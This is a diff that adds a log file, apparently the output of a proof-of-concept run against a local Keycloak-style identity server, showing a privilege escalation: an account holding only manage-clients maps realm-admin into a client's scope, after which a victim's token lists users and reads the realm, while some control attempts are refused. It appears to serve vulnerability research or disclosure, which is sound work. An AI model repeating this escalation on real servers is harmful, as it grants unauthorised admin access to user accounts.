@@ -1,0 +1,25 @@
+[setup] create realm k1run3: HTTP 201
+[diag] realm rep adminPermissionsEnabled field: False; attributes: {'cibaBackchannelTokenDeliveryMode': 'poll', 'cibaExpiresIn': '120', 'cibaAuthRequestedUserHint': 'login_hint', 'oauth2DeviceCodeLifespan': '600', 'oauth2DevicePollingInterval': '5', 'parRequestUriLifespan': '60', 'cibaInterval': '5', 'realmReusableOtpCode': 'false'}
+[setup] realm-management uuid=2166ce07-7cdf-4c84-b565-bea2213749aa
+[setup] realm roles app-user, plain-role, innocent-bundle(->manage-realm) created
+[setup] client portal (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP 204
+[setup] client portal2 (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP 204
+[setup] client deleg-app with role deleg-role created
+[setup] built-in client scope kc-admin-api id=cfd7e67a-99fd-4f98-8bd9-c23af85c963d
+[setup] victim granted realm-admin (by trusted admin): HTTP 204
+[setup] delegated granted ONLY manage-clients: HTTP 200; effective: ['manage-clients']
+[diag] delegated GET /clients (manage-clients effective?): HTTP 200
+[baseline] victim@portal realm-management roles: []; aud=None; scope=email profile
+[baseline] victim@portal token -> GET /admin/realms/k1run3/users: HTTP 401
+[legit] delegated assigns kc-admin-api client scope to portal: HTTP 204 
+[pre-attack] victim@portal realm-management roles: []; aud=http://127.0.0.1:8080/admin/realms/k1run3; scope=kc-admin-api email profile
+[pre-attack] victim@portal token (admin audience, roles still filtered) -> GET users: HTTP 403 (expect 403)
+[control] delegated adds realm-admin as composite child of deleg-role: HTTP 403 (expect 403) resp={'error': 'HTTP 403 Forbidden'}
+[probe] delegated adds PLAIN realm role plain-role to portal2 scope mappings: HTTP 403 resp={'error': 'HTTP 403 Forbidden'}
+[attack2] delegated adds composite innocent-bundle (child=manage-realm) to portal2 scope mappings: HTTP 403 resp={'error': 'HTTP 403 Forbidden'}
+[attack2] victim@portal2 realm-management roles now: []
+[attack1] delegated adds realm-admin to portal scope mappings: HTTP 204 resp=
+[attack1] victim@portal realm-management roles now: ['create-client', 'impersonation', 'manage-authorization', 'manage-clients', 'manage-events', 'manage-identity-providers', 'manage-organizations', 'manage-realm', 'manage-users', 'query-clients', 'query-groups', 'query-organizations', 'query-realms', 'query-users', 'realm-admin', 'view-authorization', 'view-clients', 'view-events', 'view-identity-providers', 'view-organizations', 'view-realm', 'view-users']
+[impact] victim@portal post-attack token -> GET /admin/realms/k1run3/users: HTTP 200 (entries: 2)
+[impact] usernames visible: ['delegated', 'victim']
+[impact] victim@portal post-attack token -> GET /admin/realms/k1run3: HTTP 200
